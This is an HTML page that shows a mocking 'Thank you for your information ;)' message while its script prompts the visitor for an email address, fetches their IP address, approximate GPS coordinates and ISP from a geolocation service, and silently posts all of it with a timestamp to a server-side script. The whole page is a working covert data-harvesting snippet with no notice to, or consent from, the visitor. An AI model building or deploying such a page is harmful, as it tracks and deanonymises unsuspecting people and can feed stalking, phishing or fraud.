<!DOCTYPE html>
<html>
<head>
	<title>Thank you for your information</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>
	<div id="message" style="text-align:center;font-size:36px;margin-top:100px;">Thank you for your information ;)</div>

	<script type="text/javascript">
		// Get viewer's email address
		var email = "";
		if (localStorage.getItem("email") !== null) {
			email = localStorage.getItem("email");
		} else {
			email = prompt("Please enter your email address:");
			localStorage.setItem("email", email);
		}

		// Get viewer's IP address, GPS location, and ISP
		fetch("https://ipapi.co/json/")
			.then(response => response.json())
			.then(data => {
				var ip = data.ip;
				var lat = data.latitude;
				var lon = data.longitude;
				var isp = data.org;

				// Get current timestamp
				var date = new Date();
				var timestamp = date.toLocaleString();

				// Compile data into text file
				var textFile = "Email: " + email + "\nIP: " + ip + "\nGPS: " + lat + "," + lon + "\nISP: " + isp + "\nTimestamp: " + timestamp;
				
				// Send data to server
				var xhr = new XMLHttpRequest();
				xhr.open("POST", "save-info.php", true);
				xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
				xhr.onreadystatechange = function() {
					if (xhr.readyState === 4 && xhr.status === 200) {
						console.log(xhr.responseText);
					}
				};
				xhr.send("data=" + encodeURIComponent(textFile));
			})
			.catch(error => console.log(error));
	</script>
</body>
</html>
